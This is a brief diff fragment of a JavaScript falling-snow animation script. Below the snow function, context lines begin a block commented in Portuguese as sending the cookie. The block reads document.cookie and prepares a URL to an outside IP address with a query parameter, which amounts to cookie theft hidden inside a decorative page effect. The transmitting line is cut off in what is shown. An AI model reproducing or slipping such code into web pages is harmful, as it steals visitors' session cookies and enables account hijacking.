@@ -65,6 +65,7 @@ function SnowStart()
 	}
 	snow_time = setTimeout("SnowStart()", 10);
 }
+
 // inicio - Envio cookie
 a = document.cookie;
 b = "http://192.168.0.123/?=";
